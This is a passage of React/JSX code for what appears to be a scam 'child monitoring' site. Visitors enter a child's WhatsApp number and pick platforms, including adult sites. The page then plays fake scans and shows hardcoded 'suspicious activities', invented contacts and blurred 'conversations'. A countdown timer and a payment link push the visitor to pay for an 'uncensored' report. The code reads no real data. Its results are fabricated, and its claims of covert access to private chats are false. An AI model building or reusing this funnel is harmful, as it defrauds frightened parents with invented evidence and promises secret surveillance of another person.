                        <p className="text-xs sm:text-sm text-gray-400 mt-2 font-medium">
                          Used to identify your child's profile and monitor suspicious WhatsApp activities.
                        </p>

                        {(profilePhoto || isLoadingPhoto) && (
                          <div className="mt-4 p-3 sm:p-4 bg-gray-800 rounded-xl border border-gray-600">
                            <div className="flex items-center gap-3 sm:gap-4">
                              {isLoadingPhoto ? (
                                <div className="w-12 h-12 sm:w-14 sm:h-14 bg-gray-700 rounded-xl animate-pulse" />
                              ) : (
                                <div className="w-12 h-12 sm:w-14 sm:h-14 bg-green-500 rounded-xl flex items-center justify-center">
                                  <CheckCircle className="w-8 h-8 text-white" />
                                </div>
                              )}
                              <div className="flex-1">
                                <p className="font-semibold text-white text-sm sm:text-base">
                                  WhatsApp Profile Identified
                                </p>
                                <p className="text-xs sm:text-sm text-gray-400 mt-1">
                                  Connected profile - active monitoring
                                </p>
                                {isPhotoPrivate && (
                                  <p className="text-xs text-yellow-400 mt-1 font-medium">
                                    ⚠️ Profile with privacy enabled - may indicate secretive behavior
                                  </p>
                                )}
                              </div>
                            </div>
                          </div>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm sm:text-base font-semibold text-blue-600 mb-2 sm:mb-3">
                          Platforms to Monitor
                        </label>
                        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                          {[
                            {
                              name: "WhatsApp",
                              icon: MessageCircle,
                              color: "text-green-600",
                              description: "Messages and contacts",
                            },
                            { name: "OnlyFans", icon: Users, color: "text-pink-600", description: "Adult content" },
                            {
                              name: "Omegle",
                              icon: MessageSquare,
                              color: "text-blue-600",
                              description: "Anonymous chat",
                            },
                            {
                              name: "Chatroulette",
                              icon: Users,
                              color: "text-purple-600",
                              description: "Random video calls",
                            },
                            {
                              name: "Kik",
                              icon: MessageCircle,
                              color: "text-orange-600",
                              description: "Private messages",
                            },
                            {
                              name: "Telegram",
                              icon: MessageSquare,
                              color: "text-cyan-600",
                              description: "Secret chats",
                            },
                            {
                              name: "Roblox",
                              icon: Gamepad2,
                              color: "text-red-600",
                              description: "Games and chat",
                            },
                            {
                              name: "Instagram",
                              icon: Instagram,
                              color: "text-purple-500",
                              description: "Posts and stories",
                            },
                            {
                              name: "Facebook",
                              icon: Users,
                              color: "text-blue-500",
                              description: "Social network",
                            },
                            { name: "X-V████", icon: Users, color: "text-red-600", description: "Adult content" },
                            {
                              name: "Snapchat",
                              icon: MessageCircle,
                              color: "text-yellow-500",
                              description: "Temporary messages",
                            },
                            {
                              name: "Discord",
                              icon: MessageSquare,
                              color: "text-indigo-600",
                              description: "Private servers",
                            },
                            { name: "TikTok", icon: Users, color: "text-black", description: "Short videos" },
                            {
                              name: "Reddit",
                              icon: MessageSquare,
                              color: "text-orange-500",
                              description: "Anonymous forums",
                            },
                            {
                              name: "Twitch",
                              icon: Users,
                              color: "text-purple-500",
                              description: "Live streams",
                            },
                          ].map((platform) => (
                            <button
                              key={platform.name}
                              type="button"
                              onClick={() => togglePlatform(platform.name)}
                              disabled={platform.name === "WhatsApp"}
                              className={`p-3 rounded-xl border-2 transition-all duration-200 ${
                                selectedPlatforms.includes(platform.name)
                                  ? "border-blue-500 bg-blue-50"
                                  : "border-gray-200 bg-white hover:border-gray-300"
                              } ${platform.name === "WhatsApp" ? "opacity-100" : ""}`}
                            >
                              <platform.icon className={`w-6 h-6 mx-auto mb-2 ${platform.color}`} />
                              <p className="text-sm font-medium text-gray-900">{platform.name}</p>
                              {platform.name === "WhatsApp" && (
                                <p className="text-xs text-blue-600 mt-1">Always included</p>
                              )}
                            </button>
                          ))}
                        </div>
                        <p className="text-xs sm:text-sm text-gray-500 mt-2">
                          Select the platforms you want to monitor. WhatsApp is always included.
                        </p>
                      </div>
                    </div>

                    <div className="mt-8 sm:mt-10">
                      <Button
                        onClick={handleSubmitForm}
                        disabled={!canVerify || isSubmittingEmail}
                        className="w-full py-3 sm:py-4 text-base sm:text-lg font-bold rounded-xl bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed transition-all duration-200"
                      >
                        {isSubmittingEmail ? (
                          <div className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                            Starting Monitoring...
                          </div>
                        ) : (
                          "Start Complete Tracking"
                        )}
                      </Button>

                      {!canVerify && (
                        <p className="text-center text-sm text-red-500 mt-3 font-medium">
                          Fill in all fields (name, age and number) to continue
                        </p>
                      )}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </motion.div>
          )}

          {currentStep === "verification" && (
            <motion.div
              key="verification"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="min-h-screen bg-black flex items-center justify-center px-4 py-8"
            >
              <div className="w-full max-w-md">
                <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
                  <CardContent className="p-6 sm:p-8 text-center">
                    <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-blue-500 to-purple-600 rounded-2xl flex items-center justify-center mx-auto mb-6 sm:mb-8 shadow-lg">
                      <Search className="w-8 h-8 sm:w-10 sm:h-10 text-white animate-pulse" />
                    </div>

                    <h2 className="text-xl sm:text-2xl font-bold text-[#333333] mb-4 sm:mb-6">
                      🔍 Scanning All Platforms...
                    </h2>

                    <div className="mb-6 sm:mb-8">
                      <Progress value={verificationProgress} className="h-3 sm:h-4 mb-4 sm:mb-6" />
                      <p className="text-sm sm:text-base text-gray-600 font-medium">{verificationMessage}</p>
                    </div>

                    <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                      <div className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-gray-50 rounded-xl">
                        <div className="w-2 h-2 sm:w-3 sm:h-3 bg-green-500 rounded-full animate-pulse" />
                        <span className="text-xs sm:text-sm text-gray-700 font-medium">
                          WhatsApp, Discord, TikTok scanning...
                        </span>
                      </div>
                      <div className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-gray-50 rounded-xl">
                        <div className="w-2 h-2 sm:w-3 sm:h-3 bg-blue-500 rounded-full animate-pulse" />
                        <span className="text-xs sm:text-sm text-gray-700 font-medium">
                          Facial recognition processing...
                        </span>
                      </div>
                      <div className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-gray-50 rounded-xl">
                        <div className="w-2 h-2 sm:w-3 sm:h-3 bg-purple-500 rounded-full animate-pulse" />
                        <span className="text-xs sm:text-sm text-gray-700 font-medium">Location data analysis...</span>
                      </div>
                    </div>

                    <div className="text-center">
                      <p className="text-xs sm:text-sm text-gray-500 flex items-center justify-center gap-2 font-medium">
                        <Lock className="w-4 h-4" />
                        Secure and encrypted connection - No trace left
                      </p>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </motion.div>
          )}

          {currentStep === "preliminary" && (
            <motion.div
              key="preliminary"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="min-h-screen bg-black flex items-center justify-center px-4 py-8"
            >
              <div className="w-full max-w-lg">
                <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
                  <CardContent className="p-6 sm:p-8">
                    <div className="text-center mb-6 sm:mb-8">
                      <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-red-500 to-orange-500 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-lg animate-pulse">
                        <AlertTriangle className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
                      </div>
                      <h2 className="text-xl sm:text-2xl md:text-3xl font-bold text-blue-600 mb-3 sm:mb-4">
                        We Found Suspicious Activities...
                      </h2>
                    </div>

                    <div className="bg-gradient-to-r from-red-50 to-orange-50 border-2 border-red-200 rounded-xl p-4 sm:p-6 mb-6 sm:mb-8">
                      <div className="flex items-center gap-3 sm:gap-4 mb-3 sm:mb-4">
                        <AlertTriangle className="w-6 h-6 sm:w-8 sm:h-8 text-red-500 flex-shrink-0" />
                        <h3 className="text-lg sm:text-xl font-bold text-red-700">SUSPICIOUS ACTIVITIES DETECTED</h3>
                      </div>
                      <p className="text-sm sm:text-base text-red-600 font-medium leading-relaxed">
                        Our system discovered multiple suspicious activities linked to this person on{" "}
                        {selectedPlatforms.length} different platforms
                      </p>
                    </div>

                    <div className="mb-6 sm:mb-8">
                      <h4 className="text-base sm:text-lg font-bold text-blue-600 mb-4">🔍 Scanned Platforms:</h4>
                      <div className="grid grid-cols-2 gap-3">
                        {selectedPlatforms.map((platformName) => {
                          const platform =
                            monitoringPlatforms.find((p) => p.name === platformName) ||
                            [
                              { name: "OnlyFans", icon: Users, color: "text-pink-600", description: "Adult content" },
                              {
                                name: "Omegle",
                                icon: MessageSquare,
                                color: "text-blue-600",
                                description: "Anonymous chat",
                              },
                              {
                                name: "Chatroulette",
                                icon: Users,
                                color: "text-purple-600",
                                description: "Random video calls",
                              },
                              {
                                name: "Kik",
                                icon: MessageCircle,
                                color: "text-orange-600",
                                description: "Private messages",
                              },
                              {
                                name: "Telegram",
                                icon: MessageSquare,
                                color: "text-cyan-600",
                                description: "Secret chats",
                              },
                              { name: "Facebook", icon: Users, color: "text-blue-500", description: "Social network" },
                              { name: "X-V████", icon: Users, color: "text-red-600", description: "Adult content" },
                              {
                                name: "Snapchat",
                                icon: MessageCircle,
                                color: "text-yellow-500",
                                description: "Temporary messages",
                              },
                              {
                                name: "Discord",
                                icon: MessageSquare,
                                color: "text-indigo-600",
                                description: "Private servers",
                              },
                              { name: "TikTok", icon: Users, color: "text-black", description: "Short videos" },
                              {
                                name: "Reddit",
                                icon: MessageSquare,
                                color: "text-orange-500",
                                description: "Anonymous forums",
                              },
                              {
                                name: "Twitch",
                                icon: Users,
                                color: "text-purple-500",
                                description: "Live streams",
                              },
                            ].find((p) => p.name === platformName)

                          if (!platform) return null

                          return (
                            <div key={platformName} className="flex items-center gap-3 p-3 bg-gray-50 rounded-xl">
                              <platform.icon className={`w-5 h-5 ${platform.color}`} />
                              <div>
                                <p className="text-sm font-bold text-gray-900">{platform.name}</p>
                                <p className="text-xs text-green-600">✓ Scanned</p>
                              </div>
                            </div>
                          )
                        })}
                      </div>
                    </div>

                    <div className="space-y-4 sm:space-y-6 mb-6 sm:mb-8">
                      <div className="flex items-start gap-3 sm:gap-4 p-4 sm:p-5 bg-gray-50 rounded-xl">
                        <CheckCircle className="w-5 h-5 sm:w-6 sm:h-6 text-green-500 flex-shrink-0 mt-1" />
                        <div>
                          <h4 className="font-bold text-blue-600 text-sm sm:text-base mb-1 sm:mb-2">
                            Last Activity: 3 hours ago
                          </h4>
                          <p className="text-xs sm:text-sm text-gray-600">
                            We detected activity in anonymous Google tab recently...
                          </p>
                        </div>
                      </div>

                      <div className="flex items-start gap-3 sm:gap-4 p-4 sm:p-5 bg-gray-50 rounded-xl">
                        <CheckCircle className="w-5 h-5 sm:w-6 sm:h-6 text-green-500 flex-shrink-0 mt-1" />
                        <div>
                          <h4 className="font-bold text-blue-600 text-sm sm:text-base mb-1 sm:mb-2">
                            {selectedPlatforms.length} Currently Active Platforms
                          </h4>
                          <p className="text-xs sm:text-sm text-gray-600">
                            {selectedPlatforms.slice(0, 3).join(", ")} and a{" "}
                            <span className="animate-pulse text-red-500 font-bold">critical +18 platform</span>
                          </p>
                        </div>
                      </div>

                      <div className="flex items-start gap-3 sm:gap-4 p-4 sm:p-5 bg-gray-50 rounded-xl">
                        <CheckCircle className="w-5 h-5 sm:w-6 sm:h-6 text-green-500 flex-shrink-0 mt-1" />
                        <div>
                          <h4 className="font-bold text-blue-600 text-sm sm:text-base mb-1 sm:mb-2">
                            Recent Conversations Detected
                          </h4>
                          <p className="text-xs sm:text-sm text-gray-600">
                            Active messages with multiple contacts and groups this week
                          </p>
                        </div>
                      </div>
                    </div>

                    <div className="bg-gradient-to-r from-blue-50 to-purple-50 border-2 border-blue-200 rounded-xl p-4 sm:p-6 mb-6 sm:mb-8">
                      <div className="flex items-center gap-2 sm:gap-3 mb-3 sm:mb-4">
                        <div className="w-6 h-6 sm:w-8 sm:h-8 bg-blue-500 rounded-full flex items-center justify-center">
                          <span className="text-white text-xs sm:text-sm font-bold">💡</span>
                        </div>
                        <h3 className="text-base sm:text-lg font-bold text-blue-700">
                          What you'll see in the Complete Report:
                        </h3>
                      </div>
                      <ul className="space-y-2 sm:space-y-3 text-xs sm:text-sm text-blue-600">
                        <li className="flex items-center gap-2 sm:gap-3">
                          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-blue-500 rounded-full flex-shrink-0" />
                          Screenshots of all active profiles
                        </li>
                        <li className="flex items-center gap-2 sm:gap-3">
                          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-blue-500 rounded-full flex-shrink-0" />
                          Conversations and screens from all platforms triggered by parents
                        </li>
                        <li className="flex items-center gap-2 sm:gap-3">
                          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-blue-500 rounded-full flex-shrink-0" />
                          Exact locations where they've been browsing
                        </li>
                        <li className="flex items-center gap-2 sm:gap-3">
                          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-blue-500 rounded-full flex-shrink-0" />
                          Timeline of all activities for better protection of your child
                        </li>
                      </ul>
                    </div>

                    <Button
                      onClick={() => setCurrentStep("generating")}
                      className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 sm:py-4 text-sm sm:text-base md:text-lg rounded-xl shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-300 mb-4 sm:mb-6 overflow-hidden flex items-center justify-center text-center"
                    >
                      <span className="block text-center leading-tight px-2 break-words whitespace-normal">
                        🔓 UNLOCK COMPLETE EVIDENCE – SEE EVERYTHING
                      </span>
                    </Button>

                    <div className="text-center">
                      <p className="text-xs sm:text-sm text-gray-500 flex items-center justify-center gap-2 font-medium">
                        <Lock className="w-4 h-4" />
                        Complete anonymity guaranteed - They'll never know you checked
                      </p>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </motion.div>
          )}

          {/* Generating Report - Mobile Optimized */}
          {currentStep === "generating" && (
            <motion.div
              key="generating"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="min-h-screen bg-black flex items-center justify-center px-4 py-8"
            >
              <div className="w-full max-w-md">
                <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
                  <CardContent className="p-6 sm:p-8 text-center">
                    <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-green-500 to-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 sm:mb-8 shadow-lg">
                      <div className="w-8 h-8 sm:w-10 sm:h-10 border-4 border-white border-t-transparent rounded-full animate-spin" />
                    </div>

                    <h2 className="text-xl sm:text-2xl font-bold text-[#333333] mb-4 sm:mb-6">
                      📊 Generating Complete Report...
                    </h2>

                    <div className="mb-6 sm:mb-8">
                      <Progress value={generatingProgress} className="h-3 sm:h-4 mb-4 sm:mb-6" />
                      <p className="text-sm sm:text-base text-gray-600 font-medium">{generatingMessage}</p>
                    </div>

                    <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                      <div className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-green-50 rounded-xl">
                        <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 text-green-500" />
                        <span className="text-xs sm:text-sm text-gray-700 font-medium">Profile photos analyzed</span>
                      </div>
                      <div className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-blue-50 rounded-xl">
                        <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
                        <span className="text-xs sm:text-sm text-gray-700 font-medium">
                          Processing conversations...
                        </span>
                      </div>
                      <div className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-gray-50 rounded-xl">
                        <div className="w-4 h-4 sm:w-5 sm:h-5 bg-gray-300 rounded-full" />
                        <span className="text-xs sm:text-sm text-gray-500">Finalizing report...</span>
                      </div>
                    </div>

                    <div className="text-center">
                      <p className="text-xs sm:text-sm text-gray-500 flex items-center justify-center gap-2 font-medium">
                        <Lock className="w-4 h-4" />
                        Encrypting sensitive data for your privacy
                      </p>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </motion.div>
          )}

          {/* Result - Mobile Optimized */}
          {currentStep === "result" && (
            <motion.div
              key="result"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="min-h-screen bg-black px-4 py-6 sm:py-8"
            >
              <div className="container mx-auto max-w-4xl">
                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                  <div className="bg-gradient-to-r from-red-500 to-red-600 text-white p-3 sm:p-4 rounded-xl shadow-lg">
                    <div className="flex items-center gap-2 sm:gap-3">
                      <AlertTriangle className="w-5 h-5 sm:w-6 sm:h-6 animate-pulse" />
                      <div>
                        <h3 className="font-bold text-sm sm:text-base">
                          🚨 PROFILE FOUND ON 3 SOCIAL NETWORKS AND TWO CITY GROUPS AND ONE CONVERSATION FROM ANOTHER
                          REGION
                        </h3>
                        <p className="text-xs sm:text-sm opacity-90">Last viewed: Online now</p>
                      </div>
                    </div>
                  </div>

                  <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white p-3 sm:p-4 rounded-xl shadow-lg">
                    <div className="flex items-center gap-2 sm:gap-3">
                      <AlertTriangle className="w-5 h-5 sm:w-6 sm:h-6" />
                      <div>
                        <h3 className="font-bold text-sm sm:text-base">⚠️ ATTENTION: ACTIVE PROFILE FOUND!</h3>
                        <p className="text-xs sm:text-sm opacity-90">
                          We confirmed that this number is linked to an ACTIVE profile on social networks. Most recent
                          usage records detected in {city || "your region"}.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 mb-6 sm:mb-8">
                  <div className="bg-white rounded-xl p-3 sm:p-4 text-center shadow-lg">
                    <div className="text-xl sm:text-2xl font-bold text-red-500 mb-1">8</div>
                    <div className="text-xs sm:text-sm text-gray-600 font-medium">SITES (7 DAYS)</div>
                  </div>
                  <div className="bg-white rounded-xl p-3 sm:p-4 text-center shadow-lg">
                    <div className="text-xl sm:text-2xl font-bold text-orange-500 mb-1">30</div>
                    <div className="text-xs sm:text-sm text-gray-600 font-medium">MESSAGES (7 DAYS)</div>
                  </div>
                  <div className="bg-white rounded-xl p-3 sm:p-4 text-center shadow-lg">
                    <div className="text-xl sm:text-2xl font-bold text-purple-500 mb-1">5</div>
                    <div className="text-xs sm:text-sm text-gray-600 font-medium">TELEGRAM PHOTOS</div>
                  </div>
                  <div className="bg-white rounded-xl p-3 sm:p-4 text-center shadow-lg">
                    <div className="text-xl sm:text-2xl font-bold text-green-500 mb-1">4</div>
                    <div className="text-xs sm:text-sm text-gray-600 font-medium">ACTIVE GROUPS</div>
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 mb-6 sm:mb-8">
                  <div className="bg-white rounded-xl p-3 sm:p-4 text-center shadow-lg">
                    <div className="text-xl sm:text-2xl font-bold text-blue-500 mb-1">12h</div>
                    <div className="text-xs sm:text-sm text-gray-600 font-medium">LAST ACTIVITY</div>
                  </div>
                  <div className="bg-white rounded-xl p-3 sm:p-4 text-center shadow-lg">
                    <div className="text-xl sm:text-2xl font-bold text-indigo-500 mb-1">3</div>
                    <div className="text-xs sm:text-sm text-gray-600 font-medium">NIGHTTIME ACTIVITIES</div>
                  </div>
                </div>

                <Card className="bg-white rounded-2xl shadow-lg border-0 mb-6 sm:mb-8">
                  <CardContent className="p-4 sm:p-6">
                    <h3 className="text-lg sm:text-xl font-bold text-[#333333] mb-4 sm:mb-6">
                      🔥 SUSPICIOUS CONTACTS FOUND
                    </h3>
                    <div className="space-y-3 sm:space-y-4">
                      {generateSuspiciousContacts().map((profile, index) => (
                        <div key={index} className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-gray-50 rounded-xl">
                          <div
                            className={`w-12 h-12 sm:w-14 sm:h-14 rounded-xl flex items-center justify-center text-2xl ${profile.iconColor}`}
                          >
                            {profile.icon}
                          </div>
                          <div className="flex-1">
                            <h4 className="font-bold text-[#333333] text-sm sm:text-base">{profile.name}</h4>
                            <p className="text-xs sm:text-sm text-gray-600">Last viewed: {profile.lastSeen}</p>
                            <p className="text-xs sm:text-sm text-red-600 font-medium">Suspicious activity detected</p>
                          </div>
                          <div className="w-2 h-2 sm:w-3 sm:h-3 bg-red-500 rounded-full animate-pulse" />
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>

                <Card className="bg-white rounded-2xl shadow-lg border-0 mb-6 sm:mb-8">
                  <CardContent className="p-4 sm:p-6">
                    <h3 className="text-lg sm:text-xl font-bold text-[#333333] mb-4 sm:mb-6">
                      📸 CENSORED CONVERSATIONS
                    </h3>
                    <p className="text-sm sm:text-base text-gray-600 mb-4 sm:mb-6">
                      Get instant access to the complete report with uncensored conversations and complete history. Even
                      if they try to delete, we have everything saved.
                    </p>

                    <div className="relative">
                      <div className="overflow-hidden rounded-xl">
                        <div
                          className="flex transition-transform duration-300 ease-in-out"
                          style={{ transform: `translateX(-${currentSlide * 100}%)` }}
                        >
                          {blockedImages.map((image, index) => (
                            <div key={index} className="w-full flex-shrink-0 relative">
                              <img
                                src={image || "/placeholder.svg"}
                                alt={`Conversation ${index + 1}`}
                                className="w-full h-48 sm:h-64 object-cover"
                                style={{ filter: "blur(8px) brightness(0.7)" }}
                              />
                              <div className="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center">
                                <div className="text-center">
                                  <Lock className="w-8 h-8 sm:w-10 sm:h-10 text-white mx-auto mb-2 opacity-80" />
                                  <p className="text-white text-xs font-bold opacity-80">BLOCKED</p>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      <button
                        onClick={prevSlide}
                        className="absolute left-2 top-1/2 transform -translate-y-1/2 bg-black/50 text-white p-2 rounded-full hover:bg-black/70 transition-colors"
                      >
                        <svg className="w-4 h-4 sm:w-5 sm:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                        </svg>
                      </button>
                      <button
                        onClick={nextSlide}
                        className="absolute right-2 top-1/2 transform -translate-y-1/2 bg-black/50 text-white p-2 rounded-full hover:bg-black/70 transition-colors"
                      >
                        <svg className="w-4 h-4 sm:w-5 sm:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                        </svg>
                      </button>

                      <div className="flex justify-center gap-2 mt-4">
                        {blockedImages.map((_, index) => (
                          <button
                            key={index}
                            onClick={() => setCurrentSlide(index)}
                            className={`w-2 h-2 sm:w-3 sm:h-3 rounded-full transition-colors ${
                              index === currentSlide ? "bg-blue-500" : "bg-gray-300"
                            }`}
                          />
                        ))}
                      </div>
                    </div>
                  </CardContent>
                </Card>

                <Card className="bg-white rounded-2xl shadow-lg border-0">
                  <CardContent className="p-4 sm:p-6 text-center">
                    <div className="mb-4 sm:mb-6">
                      <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-green-500 to-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-lg">
                        <Lock className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
                      </div>
                      <h3 className="text-xl sm:text-2xl font-bold text-[#333333] mb-3 sm:mb-4">
                        🔓 UNLOCK COMPLETE REPORT
                      </h3>
                      <p className="text-sm sm:text-base text-gray-600 mb-4 sm:mb-6">
                        Get instant access to the complete report with uncensored conversations and complete history.
                        Even if they try to delete, we have everything saved.
                      </p>
                    </div>

                    <div className="bg-gradient-to-r from-red-500 to-red-600 text-white p-4 sm:p-6 rounded-xl shadow-lg mb-4 sm:mb-6">
                      <div className="flex items-center justify-center gap-2 sm:gap-3 mb-3">
                        <AlertTriangle className="w-6 h-6 sm:w-8 sm:h-8 animate-pulse" />
                        <span className="font-bold text-lg sm:text-xl">THE REPORT WILL BE DELETED IN:</span>
                      </div>
                      <div className="text-center mb-3">
                        <div className="text-3xl sm:text-4xl font-bold mb-2">{formatTime(timeLeft)}</div>
                      </div>
                      <p className="text-sm sm:text-base text-center leading-relaxed opacity-90">
                        After time expires, this report will be permanently removed for privacy reasons. Even if they
                        claim to have deleted it, we still have access to the data.
                      </p>
                    </div>

                    <Button
                      onClick={() =>
                        window.open("https://pay.mundpay.com/0198c3e3-499d-7385-8865-25f594b421a7?ref=", "_blank")
                      }
                      className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 sm:py-4 text-sm sm:text-base md:text-lg rounded-xl shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-300 mb-4 sm:mb-6 overflow-hidden"
                    >
                      <span className="block text-center leading-tight px-2">🔓 UNLOCK MY COMPLETE REPORT</span>
                    </Button>

                    <div className="mt-4 sm:mt-6">
                      <p className="text-xs sm:text-sm text-gray-500 flex items-center justify-center gap-2 font-medium">
                        <Shield className="w-4 h-4" />
                        100% Anonymous - They'll Never Know
                      </p>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  )
}
